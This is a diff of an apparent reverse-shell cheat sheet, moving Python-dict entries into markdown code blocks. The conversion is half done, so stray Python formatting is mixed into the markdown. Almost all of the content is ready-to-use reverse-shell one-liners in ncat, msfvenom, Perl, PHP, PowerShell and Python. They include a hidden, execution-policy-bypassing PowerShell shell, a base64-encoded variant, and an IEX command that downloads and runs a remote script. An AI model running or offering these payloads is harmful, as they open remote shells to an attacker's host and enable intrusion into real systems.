@@ -85,7 +85,7 @@ ncat %s %d -e /bin/sh' % (ipaddr, port),
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%d -f macho > revshell.macho' % (ipaddr, port),
 ```
 
-```bqsh
+```bash
 # Perl - Option 1
 perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % (ipaddr, port),
 ```       
@@ -115,10 +115,17 @@ php -r \'$s=fsockopen("%s",%d);shell_exec("/bin/sh -i <&3 >&3 2>&3");\'' % (ipad
 php -r \'$s=fsockopen("%s",%d);`/bin/sh -i <&3 >&3 2>&3`;\'' % (ipaddr, port),
 ```
 
+```bash
+# PHP-4
+php -r \'$s=fsockopen("%s",%d);system("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
+```
 
-'php-4':'php -r \'$s=fsockopen("%s",%d);system("/bin/sh -i <&3 >&3 2>&3");\'' % (ipaddr, port),
-        'php-5':'php -r \'$s=fsockopen("%s",%d);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'' % (ipaddr, port),
-        'ps-tcp':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
+```bash
+# PHP-5
+php -r \'$s=fsockopen("%s",%d);popen("/bin/sh -i <&3 >&3 2>&3", "r");\'' % (ipaddr, port),
+```
+
+'ps-tcp':'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port),
         'ps-iex':'powershell IEX (New-Object Net.WebClient).DownloadString("http://%s:%d/revshell.ps1") \n\nMake a revshell.ps1 file and put it on your server!' % (ipaddr, port),
         'ps-b64':'powershell -e '+ b64encode(('$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ipaddr, port)).encode('utf16')[2:]).decode(),
         'python':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (ipaddr, port),
